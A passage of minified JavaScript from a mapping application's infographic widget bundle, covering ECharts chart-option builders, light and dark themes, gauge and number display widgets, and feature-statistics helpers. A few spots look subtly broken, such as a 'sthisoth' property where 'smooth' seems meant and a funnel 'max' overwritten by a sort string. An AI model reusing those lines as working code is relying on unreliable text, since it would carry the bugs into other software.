a);var b=null,f=a.series;f.forEach(function(b){b.type||(b.type=a.type);b.type="column"===a.type?"bar":a.type});f.keek?b=f:(b=[],b=f.map(k.hitch(this,function(b){b.data=b.data.map(k.hitch(this,function(b,c){var d=null;if("funnel"===a.type||"gauge"===a.type||"pie"===a.type)d={},b||"number"===typeof b?(d.value=b.value?b.value:b,b.itemStyle&&(d.itemStyle||(d.itemStyle={}),d.itemStyle=k.mixin(d.itemStyle,b.itemStyle))):d.value=b,d.name=a.labels[c]||"";else if("column"===a.type||"bar"===a.type||"line"===
a.type){if(!b)return b;d=b}this._showBarBorderColor=d&&d.itemStyle&&d.itemStyle.normal&&"undefined"!==typeof d.itemStyle.normal.color&&"line"!==a.type?a.stack?"stack":"single":!1;return d}));b=this._settingPieSerie(b,a);b=this._settingFunnelSerie(b,a);return b=this._settingRaderSerie(b,a)})));c.series=b;return c=this._handleChartBorderWidthColor(c,a)},_settingRaderSerie:function(c,a){if("radar"!==c.type)return c;var b=a.indicator.map(function(a){return a.name});c.tooltip={};c.tooltip.formatter=function(a){return f.handleToolTip(a,
null,!1,!1,b)};return c},_settingFunnelSerie:function(c,a){if("funnel"!==c.type)return c;c.minSize="0%";c.maxSize="100%";c.sort="descending";c.min=a.min||0;c.max=a.max||100;c.max=a.funnelSort||"descending";return c},_settingPieSerie:function(c,a){if("pie"!==c.type)return c;c.selectedMode="single";c.selectedOffset=10;c.hoverOffset=5;c.radius=[0,"70%"];c.labelLine={normal:{show:!0,length:5,length2:5}};c.labelLine.normal.show="undefined"===typeof a.labelLine?!0:a.labelLine;"number"===typeof a.innerRadius&&
(0>a.innerRadius&&(a.innerRadius=0),60<a.innerRadius&&(a.innerRadius=60),c.radius[0]=a.innerRadius+"%");"rose"===a.pieMode&&(c.roseType=a.roseType||"radius");return c=this._absoluteValueForPieChart(c)},_absoluteValueForPieChart:function(c){if(!c||!c.data||!c.data[0])return c;c.data=c.data.map(function(a){"number"===typeof a?a=Math.abs(a):"object"===typeof a&&"number"===typeof a.value&&(a.value=Math.abs(a.value));return a});return c},_settingRadar:function(c,a){if("radar"!==a.type)return c;c.radar=
{nameGap:6,radius:"70%"};c.radar.axisLabel={show:!0,formatter:function(){}};a.radarShape&&(c.radar.shape=a.radarShape);a.indicator?(this._handleRadarIndicator(a),c.radar.indicator=a.indicator):console.error("No radar indicator");return c},_handleRadarIndicator:function(c){var a=c.series[0].data,b=[];c.indicator.forEach(function(c,g){if("undefined"!==typeof c.max)return c;b=a.map(function(a){b.push(a.value[g])});var f=Math.max.apply(Math,b);c.max=f})},_settingStack:function(c,a){if(!f.isAxisChart(a))return c;
a=this._stackForPercent(a);if("percent"===a.stack){var b=a.series.some(function(a){return a.data.some(function(a){a=a&&a.value?a.value:a;return"number"===typeof a&&0>a})}),k=a.series.every(function(a){return a.data.every(function(a){a=a&&a.value?a.value:a;return"number"===typeof a&&0>a})}),g=0,m=1;b&&(g=-1,k&&(m=0),"bar"===a.type?(c.xAxis.max=m,c.xAxis.min=g):(c.yAxis.max=m,c.yAxis.min=g))}a.stack&&(c.series=c.series.map(function(a){a.stack="stack";return a}));return c},_settingArea:function(c,a){if("line"!==
a.type||!a.area)return c;c.series=c.series.map(function(a){a.areaStyle||(a.areaStyle={});"undefined"===typeof a.areaStyle.opacity&&(a.areaStyle.opacity=.4);a.sthisoth=!0;a.smoothMonotone="x";return a});return c},_stackForPercent:function(c){if("percent"!==c.stack)return c;var a=[];c.series.forEach(function(b){k.clone(b.data).forEach(function(b,c){a[c]||(a[c]=[]);(b=b&&"undefined"!==typeof b.value?b.value:b)||(b=0);a[c].push(b)})});var b=[];a.forEach(function(a,c){b[c]||(b[c]=0);a.forEach(function(a){b[c]+=
Math.abs(a)})});var f=a.map(function(a,c){return a.map(function(a){return 0===b[c]?null:0<=a?Math.abs(a)/b[c]:-Math.abs(a)/b[c]})});c.series=c.series.map(function(a,b){var c=k.clone(a.data),c=c.map(function(a,c){if(!a)return a;"undefined"!==typeof a.value?a.value=f[c][b]:a=f[c][b];return a});a.data=c;return a});return c},_settingAxisDisplay:function(c,a){if(!f.isAxisChart(a))return c;c.xAxis.show=!a.hidexAxis;c.yAxis.show=!a.hideyAxis;c.grid.containLabel=!a.hideyAxis;return c},_settingLegend:function(c,
a){if(!a.legend)return c.legend={show:!1},c;c.legend={show:!0,type:"scroll",orient:"horizontal",x:"left",pageButtonPosition:"end",pageTextStyle:{color:"#939393"},bottom:20,y:"bottom",data:[]};f.isAxisChart(a)||"gauge"===a.type?c.series.forEach(function(a){c.legend.data.push(a.name)}):"pie"!==a.type&&"funnel"!==a.type&&"radar"!==a.type||c.series[0].data.forEach(function(a){c.legend.data.push(a.name)});return c=this._handleLegendRTL(c,a)},_handleLegendRTL:function(c,a){if(!a.legend)return c;a={};window.isRTL?
(a.x="right",a.pageButtonPosition="start"):(a.x="left",a.pageButtonPosition="end");c.legend=k.mixin(c.legend,a);return c},_settingScale:function(c,a){if(!a.scale)return c;"bar"===a.type?c.xAxis.scale=!0:"line"===a.type||"column"===a.type?c.yAxis.scale=!0:"radar"===a.type&&(c.radar.scale=!0);return c},_handleChartRtl:function(c,a){if(!window.isRTL)return c;if(f.isAxisChart(a)||"vertical"===a.shape||"horizontal"===a.shape)c.xAxis.inverse=!0,c.yAxis.position="right";return c},_pieChartAvoidLegendLabelOverLap:function(c,
a){if("pie"!==a.type)return c;var b=a.labelLine?.75:.85;a.legend&&(b-=.12);c.series[0].radius[1]=100*b+"%";return c},settingDataZoom:function(c,a){if(!f.isAxisChart(a)||!a.series||0===a.series.length)return c;if(a.dataZoom&&0<a.dataZoom.length){var b=this.chart.getWidth(),p=10,g=a.series[0].data.length,m=a.series.length,l=g*m;a.stack&&(l=g);5<=m&&(p=17);g=f.getAxisZeroPosition.call(this,a);b="bar"!==a.type?window.isRTL?g.left:b-g.left-c.grid.right:g.top;this.showDataZoom=b/l<p;var d=b/(l*p),d=parseFloat(100*
d,10).toFixed(3),d=100<d?100:d,d=0===d?.01:d,b=[],h="bar"===a.type?"xAxis":"yAxis",e="bar"===a.type?"yAxisIndex":"xAxisIndex",q="bar"===a.type?"width":"height";c=this._initAxisOfDataZoom(c,h);b=a.dataZoom.map(k.hitch(this,function(b){b={type:b,start:0,show:this.showDataZoom};b[e]=[0];b[q]=15;b.end=d;"xAxis"===h&&window.isRTL&&(b.left="10");return b=this._handleDataZoomPosition(a,b)}));c.dataZoom=b}else this.showDataZoom=!1,c.dataZoom=[];return c},_initAxisOfDataZoom:function(c,a){c[a].type="value";
c.xAxis.splitLine={show:!0,lineStyle:{type:"dashed"}};c.yAxis.splitLine={show:!0,lineStyle:{type:"dashed"}};return c},_handleDataZoomPosition:function(c,a){a.showDataShadow=!1;a.realtime=!1;a.bottom=c.legend?30:20;"bar"===c.type&&c.legend&&(a.bottom=50);return a},_settingGrid:function(c,a){if(!f.isAxisChart(a))return c;c.grid&&(c.grid.top=10);var b=10,k=43;a.hideyAxis&&(b=20,k=63);var g=0,m=10;a.legend&&(g=this.showDataZoom?10:20,m+=20);"line"===a.type&&a.legend&&!this.showDataZoom&&(b+=7);"bar"===
a.type?(window.isRTL?c.grid.left=this.showDataZoom?30:10:c.grid.right=this.showDataZoom?30:10,a.hideyAxis&&a.legend&&(m+=20),c.grid.bottom=m):c.grid.bottom=this.showDataZoom?k+g:b+g;return c},_handleChartBorderWidthColor:function(c,a){var b=0;"single"===this._showBarBorderColor?b=.1:"stack"===this._showBarBorderColor&&(b=1);var f="";"stack"===this._showBarBorderColor&&(f="#fff",a.backgroundColor&&"transparent"!==a.backgroundColor&&(f=a.backgroundColor));c.series=c.series.map(function(a){if("bar"===
a.type||"pie"===a.type)a.itemStyle||(a.itemStyle={}),a.itemStyle.normal||(a.itemStyle.normal={}),a.itemStyle.emphasis||(a.itemStyle.emphasis={}),a.itemStyle.normal.borderWidth=b,a.itemStyle.emphasis.borderWidth=b,f?(a.itemStyle.normal.borderColor=f,a.itemStyle.emphasis.borderColor=f):(a.itemStyle.normal.borderColor="transparent",a.itemStyle.emphasis.borderColor="transparent");return a});return c}})})},"libs/echarts/light":function(){(function(n,k){"function"===typeof define&&define.amd?define(["exports",
"./echarts"],k):"object"===typeof exports&&"string"!==typeof exports.nodeName?k(exports,require("./echarts")):k({},n.echarts)})(this,function(n,k){k?k.registerTheme("light",{color:"#2ec7c9 #b6a2de #5ab1ef #ffb980 #d87a80 #8d98b3 #e5cf0d #97b552 #95706d #dc69aa #07a2a4 #9a7fd1 #588dd5 #f5994e #c05050 #59678c #c9ab00 #7eb00a #6f5553 #c14089".split(" "),textStyle:{},title:{textStyle:{color:"#008acd"},subtextStyle:{color:"#aaaaaa"}},line:{itemStyle:{normal:{}},lineStyle:{normal:{width:"1"}},symbolSize:"5",
symbol:"circle",smooth:!1},radar:{itemStyle:{normal:{}},lineStyle:{normal:{width:"1"}},symbolSize:"6",symbol:"circle",smooth:!1},gauge:{axisLine:{lineStyle:{color:[[.31,"#58f7f3"],[1,"#E5E5E5"]]}},itemStyle:{normal:{color:"#686868"},emphasis:{color:"#686868"}}},categoryAxis:{axisLine:{show:!0,lineStyle:{color:"#008acd"}},axisTick:{show:!1,lineStyle:{color:"#333"}},axisLabel:{show:!0,textStyle:{color:"#333"}},splitLine:{show:!0,lineStyle:{type:"dashed",color:["rgba(0,0,0,0.1)"]}},splitArea:{show:!1,
areaStyle:{color:["rgba(250,250,250,0.3)","rgba(200,200,200,0.3)"]}}},valueAxis:{axisLine:{show:!0,lineStyle:{color:"#008acd"}},axisTick:{show:!1,lineStyle:{color:"#333"}},axisLabel:{show:!0,textStyle:{color:"#333"}},splitLine:{show:!0,lineStyle:{type:"dashed",color:["rgba(0,0,0,0.1)"]}},splitArea:{show:!1,areaStyle:{color:["rgba(250,250,250,0.3)","rgba(200,200,200,0.3)"]}}},toolbox:{iconStyle:{normal:{borderColor:"#2ec7c9"},emphasis:{borderColor:"#18a4a6"}}},legend:{textStyle:{color:"#333333"}},
tooltip:{axisPointer:{lineStyle:{color:"#008acd",width:"1"},crossStyle:{color:"#008acd",width:"1"}}},dataZoom:{backgroundColor:"#F4F4F4",dataBackgroundColor:"rgba(47,69,84,0.3)",fillerColor:"#E0E0E0",handleColor:"#777777",handleSize:"100%",borderColor:"#F4F4F4",textStyle:{color:"#939393"}}}):"undefined"!==typeof console&&console&&console.error&&console.error("ECharts is not Loaded")})},"libs/echarts/dark":function(){(function(n,k){"function"===typeof define&&define.amd?define(["exports","./echarts"],
k):"object"===typeof exports&&"string"!==typeof exports.nodeName?k(exports,require("./echarts")):k({},n.echarts)})(this,function(n,k){k?k.registerTheme("dark",{color:"#fc97af #87f7cf #f7f494 #72ccff #f7c5a0 #d4a4eb #d2f5a6 #76f2f2".split(" "),textStyle:{},title:{textStyle:{color:"#ffffff"},subtextStyle:{color:"#dddddd"}},line:{itemStyle:{normal:{}},lineStyle:{normal:{width:"1"}},symbolSize:"5",symbol:"circle",smooth:!1},radar:{itemStyle:{normal:{}},lineStyle:{normal:{width:"1"}},symbolSize:"5",symbol:"circle",
smooth:!1},gauge:{axisLine:{lineStyle:{color:[[.31,"#58f7f3"],[1,"#1E5F6F"]]}},itemStyle:{normal:{color:"#D9D9D9"},emphasis:{color:"#D9D9D9"}}},categoryAxis:{axisLine:{show:!0,lineStyle:{color:"#333"}},axisTick:{show:!1,lineStyle:{color:"#333"}},axisLabel:{show:!0,textStyle:{color:"#939393"}},splitLine:{show:!0,lineStyle:{type:"dashed",color:["rgba(255,255,255,0.1)"]}},splitArea:{show:!1,areaStyle:{color:["rgba(250,250,250,0.3)","rgba(200,200,200,0.3)"]}}},valueAxis:{axisLine:{show:!0,lineStyle:{color:"#333"}},
axisTick:{show:!1,lineStyle:{color:"#333"}},axisLabel:{show:!0,textStyle:{color:"#939393"}},splitLine:{show:!0,lineStyle:{type:"dashed",color:["rgba(255,255,255,0.1)"]}},splitArea:{show:!1,areaStyle:{color:["rgba(250,250,250,0.3)","rgba(200,200,200,0.3)"]}}},toolbox:{iconStyle:{normal:{borderColor:"#999999"},emphasis:{borderColor:"#666666"}}},legend:{textStyle:{color:"#999999"}},tooltip:{axisPointer:{lineStyle:{color:"#cccccc",width:1},crossStyle:{color:"#cccccc",width:1}}},dataZoom:{backgroundColor:"#525252",
dataBackgroundColor:"rgba(47,69,84,0.3)",fillerColor:"#737373",handleColor:"#BDBDBD",handleSize:"100%",borderColor:"#525252",textStyle:{color:"#939393"}}}):"undefined"!==typeof console&&console&&console.error&&console.error("ECharts is not Loaded")})},"widgets/Infographic/dijits/GaugeDijit":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/html ./BaseDijit jimu/utils jimu/dijit/Chart ./utils".split(" "),function(n,k,f,c,a,b,p){return n([c],{templateString:'\x3cdiv style\x3d"height:100%;"\x3e\x3cdiv data-dojo-attach-point\x3d"gauge"\x3e\x3c/div\x3e\x3c/div\x3e',
type:"gauge",config:null,postCreate:function(){this.inherited(arguments);this.features=[];this.DEFAULT_GAUGE_CONFIG={type:"gauge",confine:!0,shape:"curved",min:0,max:100,series:[{data:[0]}]};this.config&&(this.DEFAULT_GAUGE_CONFIG.shape=this.config.shape);this.isDarkTheme()?this.DEFAULT_GAUGE_CONFIG.theme="dark":this.DEFAULT_GAUGE_CONFIG.theme="light";this._initChart();this.setConfig(this.config)},onDataSourceDataUpdate:function(a){this.features=a.features;this._updateStatisticsValue()},resize:function(a,
b){this.chart&&(a&&b?this.chart.resize(a,b):this.chart.resize())},_updateStatisticsValue:function(){if(this.config.statistic&&this.dataSource){var a=p.getSingleValueFromFeatures(this.config.statistic,this.dataSource,this.features),a=this._getVaildValue(a);"number"===typeof a&&(this.value=a,this._setValue(this.config))}},setConfig:function(a){a&&(this.config=a,this.config.display&&this.config.display.backgroundColor&&f.setStyle(this.domNode,"backgroundColor",this.config.display.backgroundColor),this._updateStatisticsValue())},
_setValue:function(b){var c={};c.series=[{data:[this.value]}];var g=!1;"undefined"!==typeof b.max&&"undefined"!==typeof b.min&&(c.max=b.max,c.min=b.min);var d={},h=this._getIndicatorInfo(b);if(a.isNotEmptyObject(b.display)){var e=b.display;e.backgroundColor&&f.setStyle(this.domNode,"backgroundColor",e.backgroundColor);e.gaugeColor&&(d.columnColor=e.gaugeColor);e.bgColor&&(d.bgColor=e.bgColor);if(a.isNotEmptyObject(e.dataLabels)&&e.dataLabels.state){var q=e.dataLabels;d.showDataRangeLabel=!!q.dataRange;
d.showTargetValueLabel=!!q.targetValue;g=d.showTargetValueLabel;d.labelColor=q.textColor||""}q={state:!0,isRatio:!1,font:{font:{fontFamily:"Arial",bold:!1,italic:!1,underline:!1},textColor:"#59bad8"},dataFormat:{unit:"none",decimalPlaces:"",prefix:"",suffix:""}};q=e.currentValue.state?e.currentValue:q;if(a.isNotEmptyObject(q)){var e={},n=q.dataFormat;n&&""!==n.decimalPlaces&&"undefined"!==typeof n.decimalPlaces&&(e.decimalPlaces=Number(n.decimalPlaces));n=k.hitch(this,function(a,c){var d,e="";a.isRatio&&
(c/=b.max,c*=100,e="%");if(a.dataFormat){var h=a.dataFormat;a.isRatio||("percentage"===h.unit?(c*=100,e="%"):"thousand"===h.unit?(e=this.nls.thousandAbbreviation,c/=1E3):"million"===h.unit?(e=this.nls.millionAbbreviation,c/=1E6):"billion"===h.unit&&(e=this.nls.billionAbbreviation,c/=1E9));""!==h.decimalPlaces&&"undefined"!==typeof h.decimalPlaces&&(c=c.toFixed(Number(h.decimalPlaces)));d=c+e;h.prefix&&(d=h.prefix+" "+d);h.suffix&&(d+=" "+h.suffix)}return d},q,this.value);e.formatter=n;q.font&&(n=
{},"undefined"!==typeof q.font.fontSize&&(n.fontSize=Number(q.font.fontSize)),q.font.textColor&&(n.color=q.font.textColor),h.valueColor&&(n.color=h.valueColor),q.font&&q.font.font&&(q=q.font.font,n.fontWeight=q.bold?"bold":"normal",q.fontFamily&&(n.fontFamily=q.fontFamily),n.fontStyle=q.italic?"italic":"normal"),e.textStyle=n);d.valueStyle=e}}h.targetValue&&(d.targetValue=g?h.targetValue:[]);h.columnColor&&(d.columnColor=h.columnColor);c.gaugeOption=d;this.chart.updateConfig(c)},_getIndicatorInfo:function(b){var c=
!1,g=!1,d=!1,h=this._getIndicatorValues(b);a.isNotEmptyObject(h,!0)&&(c=h);if(h=b.indicators)(b=p.getVaildIndicator(this.value,h,b.max))&&b.gaugeColor&&(g=b.gaugeColor),b&&b.valueColor&&(d=b.valueColor);return{targetValue:c,columnColor:g,valueColor:d}},_initChart:function(){this.chart=new b({chartDom:this.domNode,config:this.DEFAULT_GAUGE_CONFIG});this.chart.placeAt(this.domNode);setTimeout(k.hitch(this,function(){this.chart.resize()}),300)},_getVaildValue:function(a){if("undefined"!==typeof a)return Number(a)},
_getIndicatorValues:function(b){var c=[];b.indicators&&(b.indicators.forEach(function(a){a.value&&a.value.forEach(k.hitch(this,function(d){c.push(a.isRatio?d/100*b.max:d)}))}),c.sort(function(a,b){return a-b}),c=a.uniqueArray(c));return c}})})},"widgets/Infographic/dijits/utils":function(){define("dojo/on dojo/_base/lang dojo/_base/array esri/geometry/geometryEngine jimu/utils jimu/DataSourceManager jimu/statisticsUtils".split(" "),function(n,k,f,c,a,b,p){return{getClientFeaturesFromMap:function(b,
c,f,d){var h=[],e=!1;f?0<c.getSelectedFeatures().length?(h=c.getSelectedFeatures(),e=!0):h=c.graphics:h=c.graphics;d&&(h=this._filterFeaturesByExtent(b.extent,h));if(0<h.length){var g=a.getObjectIdField(c);g&&(b=h[0])&&b.attributes&&b.attributes.hasOwnProperty(g)&&h.sort(function(a,b){a.attributes||(a.attributes={});b.attributes||(b.attributes={});a=a.attributes[g];b=b.attributes[g];return a<b?-1:a>b?1:0})}h.isSelectedFeatures=e;return h},listenClientFeaturesFromMap:function(a,b,c,d,h){var e=[];c&&
(e.push(n(b,"selection-complete",k.hitch(this,function(){h(this.getClientFeaturesFromMap(a,b,c,d))}))),e.push(n(b,"selection-clear",k.hitch(this,function(){h(this.getClientFeaturesFromMap(a,b,c,d))}))));d&&e.push(n(a,"extent-change",k.hitch(this,function(){0<b.graphics.length&&h(this.getClientFeaturesFromMap(a,b,c,d))})));e.push(n(b,"update-end",k.hitch(this,function(){h(this.getClientFeaturesFromMap(a,b,c,d))})));h(this.getClientFeaturesFromMap(a,b,c,d));return{remove:function(){e&&f.forEach(e,k.hitch(this,
function(a){a.remove()}));e=null}}},getVaildIndicator:function(a,b,c){var d=[];b.map(k.hitch(this,function(b){(b=this._handleOperator(b,a,c))&&d.push(b)}));if(0<d.length)return d[d.length-1]},getSingleValueFromFeatures:function(a,c,k){var d=b.getInstance(),h=0;if("Features"===a.type){if("DATA_SOURCE_FEATURE_LAYER_FROM_MAP"===c.dataSourceType||"Features"===d.getDataSourceConfig(c.frameWorkDsId).type)return k.length;h=0;f.forEach(k,function(a){h+=a.attributes.count});return h}if("DATA_SOURCE_FEATURE_LAYER_FROM_MAP"===
c.dataSourceType||"Features"===d.getDataSourceConfig(c.frameWorkDsId).type)return this._getStatsFromFeatures(k,a.fieldName,a.statisticsType);var e=0,g=0,h=0;f.forEach(k,function(b){var c=b.attributes[a.fieldName+"_"+a.statisticsType];switch(a.statisticsType){case "sum":e+=c;break;case "min":e=Math.min(e,c);break;case "max":e=Math.max(e,c);break;case "avg":g+=b.attributes[a.fieldName+"_sum"],h+=b.attributes.count}});"avg"===a.statisticsType&&(e=0===h?0:g/h);return e},filterFeaturesByDataSourceSetting:function(a,
b,c){if(0===a.length)return[];if(b.useSelection){var d=a[0].getLayer();if(d){var h=d.getSelectedFeatures();0<h.length&&(a=f.filter(a,function(a){return-1<h.indexOf(a)}))}}b.filterByExtent&&(a=this._filterFeaturesByExtent(c.extent,a));return a},_getStatsFromFeatures:function(a,b,c){return p.getStatisticsResultFromClientSync({featureSet:{features:a},fieldName:b,statisticTypes:[c]})[c+"Field"]},_filterFeaturesByExtent:function(a,b){var g=a.normalize();return b=f.filter(b,k.hitch(this,function(a){try{if(a.geometry){var b=
"point"===a.geometry.type||"multipoint"===a.geometry;return f.some(g,k.hitch(this,function(d){return b?d.contains(a.geometry):c.intersects(d,a.geometry)}))}}catch(e){console.error(e)}return!1}))},_handleOperator:function(a,b,c){function d(a){h={};a.valueColor&&(h.valueColor=a.valueColor);a.gaugeColor&&(h.gaugeColor=a.gaugeColor);a.iconInfo&&(h.iconInfo=a.iconInfo)}var h,e=a.value.map(k.hitch(this,function(b){return a.isRatio?b/100*c:b}));"greater"===a.operator&&b>e[0]?d(a):"smaller"===a.operator&&
b<e[0]?d(a):"between"===a.operator&&b>e[0]&&b<e[1]?d(a):"equal"===a.operator&&b===e[0]?d(a):"notEqual"===a.operator&&b!==e[0]&&d(a);return h},isInteger:function(a){return"number"===typeof a&&0===a%1}}})},"widgets/Infographic/dijits/NumberDijit":function(){define("dojo/_base/declare dojo/_base/lang esri/lang ./BaseDijit dojo/dom-style dojo/_base/html jimu/utils ./utils ./styleUtils jimu/LayerInfos/LayerInfos jimu/DataSourceManager".split(" "),function(n,k,f,c,a,b,p,g,m,l,d){return n([c],{templateString:'\x3cdiv style\x3d"height:100%;width:100%;"\x3e\x3ca data-dojo-attach-point\x3d"numberContent" class\x3d"number-content no-trim" target\x3d"_blank"\x3e\x3cdiv data-dojo-attach-point\x3d"leftIcon" class\x3d"icon"\x3e\x3c/div\x3e\x3cdiv data-dojo-attach-point\x3d"number" class\x3d"number"\x3e\x3cdiv data-dojo-attach-point\x3d"prefix" class\x3d"prefix"\x3e\x3c/div\x3e\x3cdiv class\x3d"value-content" data-dojo-attach-point\x3d"valueContent"\x3e\x3c/div\x3e\x3cdiv data-dojo-attach-point\x3d"suffix" class\x3d"suffix"\x3e\x3c/div\x3e\x3c/div\x3e\x3cdiv data-dojo-attach-point\x3d"rightIcon" class\x3d"icon"\x3e\x3c/div\x3e\x3c/a\x3e\x3c/div\x3e',
baseClass:"infographic-number-dijit",type:"number",config:null,postCreate:function(){this.inherited(arguments);this.value=this.features=null;this.setConfig(this.config)},onDataSourceDataUpdate:function(a){this.features=a.features;this._updateStatisticsValue()},setDataSource:function(a){this.dataSource=a;if(a.layerId){var b=l.getInstanceSync().getLayerInfoById(a.layerId);b&&b.getLayerObject().then(k.hitch(this,function(b){this.features=g.getClientFeaturesFromMap(this.map,b,a.useSelection,a.filterByExtent);
this._updateStatisticsValue()}))}else a.frameWorkDsId&&(b=d.getInstance().getData(a.frameWorkDsId))&&(this.features=b.features,this._updateStatisticsValue())},_updateStatisticsValue:function(){this.value=this.features&&this.config.statistic&&this.dataSource?g.getSingleValueFromFeatures(this.config.statistic,this.dataSource,this.features):null;this._updateUI(this.config,this.value)},setConfig:function(a){a&&a.background&&a.background.backgroundColor?b.setStyle(this.domNode,"backgroundColor",a.background.backgroundColor):
b.setStyle(this.domNode,"backgroundColor","#FFFFFF");this.config=a;this._updateStatisticsValue()},_updateUI:function(a,b){this._cleanUI();this.config=a;this.valueContent.innerHTML=null===b?this.nls.noData:this._tryLocaleNumber(b);p.isNotEmptyObject(this.config)&&this._setValueDisplay(this.config)},_setValueDisplay:function(a){a&&(this._setBackground(a),this._setFont(a),"undefined"!==typeof this.value&&(this._setDataFormat(a),a=this._getIndicatorColor(),a.color&&this._setValueColor(a.color),a.icon&&
this._setIndicatorIcon(a.icon)))},_setIndicatorIcon:function(a){a&&("left"===a.placement||"right"===a.placement?this._setLeftRightIcon(a):"replace"===a.placement&&this._setReplaceIcon(a))},_setReplaceIcon:function(c){var d=b.create("div",{"class":"indicator-icon "+c.icon});b.empty(this.valueContent);b.place(d,this.valueContent);a.set(d,"color",c.color);a.set(d,"display","inline-flex")},_setLeftRightIcon:function(c){var d;"left"===c.placement?d=this.leftIcon:"right"===c.placement&&(d=this.rightIcon);
b.addClass(d,"indicator-icon "+c.icon);a.set(d,"color",c.color)},_getIndicatorColor:function(){var a=!1,b=!1,c=this.config.indicators;c&&((c=g.getVaildIndicator(this.value,c))&&c.valueColor&&(a=c.valueColor),c&&p.isNotEmptyObject(c.iconInfo)&&(b=c.iconInfo));return{color:a,icon:b}},_setFont:function(a){if(a&&a.font){var c={};m.font.setStyle(a.font,c);b.setStyle(this.number,c)}},_setDataFormat:function(a){if(this.value&&a&&a.dataFormat){var b=this.value,c="";a=a.dataFormat;"percentage"===a.unit?(b*=
100,c="%"):"thousand"===a.unit?(c=this.nls.thousandAbbreviation,b/=1E3):"million"===a.unit?(c=this.nls.millionAbbreviation,b/=1E6):"billion"===a.unit&&(c=this.nls.billionAbbreviation,b/=1E9);""!==a.decimalPlaces&&"undefined"!==typeof a.decimalPlaces&&(b=b.toFixed(Number(a.decimalPlaces)));b=this._tryLocaleNumber(b)+c;this.valueContent.innerHTML=b;a.prefix&&(this.prefix.innerHTML=a.prefix);a.suffix&&(this.suffix.innerHTML=a.suffix)}},_cleanUI:function(){b.removeClass(this.leftIcon);b.addClass(this.leftIcon,
["icon"]);b.removeClass(this.rightIcon);b.addClass(this.rightIcon,["icon"]);this.replaceIcon&&(b.destroy(this.replaceIcon),this.replaceIcon=null);b.empty(this.valueContent);b.empty(this.prefix);b.empty(this.suffix);this._setValueColor("")},_getVaildValue:function(a){if("undefined"!==typeof a)return Number(a)},_setBackground:function(a){if(a&&a.background){a=a.background;a.backgroundColor&&b.setStyle(this.domNode,"backgroundColor",a.backgroundColor);if(a.alignment){var c=a.alignment;b.removeClass(this.domNode);
b.addClass(this.domNode,"infographic-number-dijit");c.horizontal&&b.addClass(this.domNode,"horizontal-"+c.horizontal);c.vertical&&b.addClass(this.domNode,"vertical-"+c.vertical)}a.link?b.setAttr(this.numberContent,"href",a.link):b.removeAttr(this.numberContent,"href")}},_setValueColor:function(b){a.set(this.number,"color",b)},_tryLocaleNumber:function(a){var b=a;if(f.isDefined(a)&&isFinite(a))try{var c=p.localizeNumber(a);"string"===typeof c&&(b=c)}catch(t){console.error(t)}return b+""}})})},"widgets/Infographic/_ChartSetting":function(){define(["dojo/_base/declare",
"dojo/_base/html","dijit/_WidgetBase","dijit/_TemplatedMixin","dojo/text!./_ChartSetting.html"],function(n,k,f,c,a){return n([f,c],{templateString:a,baseClass:"ig-chart-setting-dlg",postCreate:function(){var a=this.chartJson.config.type;"pie"===a?(k.setStyle(this.verticalAxisSection,"display","none"),k.setStyle(this.horizontalAxisSection,"display","none"),k.setStyle(this.withoutRecordsSection,"display","none")):k.setStyle(this.dataLabelsSection,"display","none");this.chartJson.config.dateConfig||
k.setStyle(this.withoutRecordsSection,"display","none");this.chartJson.config.useLayerSymbology&&"pie"!==a&&k.setStyle(this.legendSection,"display","none");"count"!==this.chartJson.config.mode&&"field"!==this.chartJson.config.mode||"pie"===a||k.setStyle(this.legendSection,"display","none");this.chartJson.config.showLegend&&this._toggle(this.legendToggle);this.chartJson.config.showDataLabel&&this._toggle(this.dataLabelsToggle);this.chartJson.config.showHorizontalAxis&&this._toggle(this.horizontalAxisToggle);
this.chartJson.config.showVerticalAxis&&this._toggle(this.verticalAxisToggle);this.chartJson.config.dateConfig&&this.chartJson.config.dateConfig.isNeedFilled&&this._toggle(this.withoutRecordsToggle)},_toggle:function(a){k.hasClass(a,"toggle-on")?(k.removeClass(a,"toggle-on"),k.addClass(a,"toggle-off")):(k.removeClass(a,"toggle-off"),k.addClass(a,"toggle-on"))},_onToggleClick:function(a){var b=a.target;this._toggle(b);a=k.hasClass(b,"toggle-on")?!0:!1;b=k.attr(b,"data-id");"legend"===b?this.chartJson.config.showLegend=
a:"dataLabels"===b?this.chartJson.config.showDataLabel=a:"horizontalAxis"===b?this.chartJson.config.showHorizontalAxis=a:"verticalAxis"===b?this.chartJson.config.showVerticalAxis=a:"withoutRecords"===b&&this.chartJson.config.dateConfig&&(this.chartJson.config.dateConfig.isNeedFilled=a);this.chartDijit.setConfig(this.chartJson.config)}})})},"widgets/Infographic/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},
"url:widgets/Infographic/_ChartSetting.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"flex section" data-dojo-attach-point\x3d"legendSection"\x3e\r\n    \x3cdiv class\x3d"label textOverFlow" title\x3d"${nls.legend}"\x3e${nls.legend}\x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"legendToggle" data-dojo-attach-event\x3d"onclick:_onToggleClick" class\x3d"jimu-leading-margin10 toggle toggle-off" data-id\x3d"legend"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv class\x3d"flex section" data-dojo-attach-point\x3d"dataLabelsSection"\x3e\r\n    \x3cdiv class\x3d"label textOverFlow" title\x3d"${nls.dataLabels}"\x3e${nls.dataLabels}\x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"dataLabelsToggle" data-dojo-attach-event\x3d"onclick:_onToggleClick" class\x3d"jimu-leading-margin10 toggle toggle-off" data-id\x3d"dataLabels"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv class\x3d"flex section" data-dojo-attach-point\x3d"horizontalAxisSection"\x3e\r\n    \x3cdiv class\x3d"label textOverFlow" title\x3d"${nls.horizontalAxis}"\x3e${nls.horizontalAxis}\x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"horizontalAxisToggle" data-dojo-attach-event\x3d"onclick:_onToggleClick" class\x3d"jimu-leading-margin10 toggle toggle-off" data-id\x3d"horizontalAxis"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv class\x3d"flex section" data-dojo-attach-point\x3d"verticalAxisSection"\x3e\r\n    \x3cdiv class\x3d"label 